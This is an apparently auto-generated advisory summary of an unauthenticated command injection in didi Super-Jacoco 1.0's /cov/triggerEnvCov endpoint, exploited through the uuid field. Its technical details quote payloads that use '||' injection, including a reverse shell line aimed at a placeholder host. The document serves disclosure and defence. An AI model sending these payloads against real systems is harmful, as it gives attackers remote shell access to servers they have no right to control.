## Vulnerability Description
A vulnerability was found in didi Super-Jacoco 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /cov/triggerEnvCov. The manipulation of the argument uuid leads to **command injection**. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

### Vulnerability Description Key Phrases
- **weakness:** **command injection**
- **product:** didi Super-Jacoco
- **version:** 1.0
- **component:** /cov/triggerEnvCov

## CVE Reference Links Content Summary
Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability stems from the lack of proper sanitization or validation of the `uuid` parameter in the `/cov/triggerEnvCov` interface of the `super-jacoco` application. This allows for command injection.

**Weaknesses/Vulnerabilities Present:**
- **Command Injection:** The primary vulnerability is that the application directly uses the user-supplied `uuid` parameter in a system command without proper sanitization. This allows an attacker to inject arbitrary commands.
- **Lack of Authorization:** The vulnerability is exploitable by "unauthorized attackers", which suggests the `/cov/triggerEnvCov` endpoint may not have adequate access controls.

**Impact of Exploitation:**
- **Arbitrary Command Execution:** Successful exploitation allows the attacker to execute arbitrary commands on the target system with the privileges of the user running the `super-jacoco` application.
- **Full System Compromise:** The attacker can potentially gain full control of the target system through the execution of malicious commands. This could include reading or modifying sensitive data, installing malware, or disrupting service.
- **Reverse Shell:** The provided proof of concept demonstrates the ability to obtain a reverse shell on the target system, granting interactive control to the attacker.

**Attack Vectors:**
- **HTTP Request Manipulation:** An attacker can craft a malicious HTTP POST request to the `/cov/triggerEnvCov` endpoint. The `uuid` parameter within the JSON body of the request is used to inject arbitrary commands.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the target `super-jacoco` instance, implying network access to the service.
- **No Authentication Required:** The description states "unauthorized attackers" can exploit the vulnerability, suggesting no prior authentication is required to trigger the vulnerability.

**Technical Details:**
- The vulnerability lies within the `/cov/triggerEnvCov` endpoint.
- The `uuid` parameter within the JSON request body is vulnerable.
- The attacker can inject commands using shell operators such as `||`
- Example payloads include file creation (`touch /tmp/triggerEnvCov1`) and reverse shell execution (`bash -i >& /dev/tcp/x.x.x.x/9333 0>&1`)

**Additional Notes:**
- The vulnerability was reported on GitHub Issues and has been assigned the ID 48.
- The vulnerable application is `didi super-jacoco` version 1.0.
- The issue was reported on Oct 21, 2024 and the submission was accepted on Oct 27, 2024
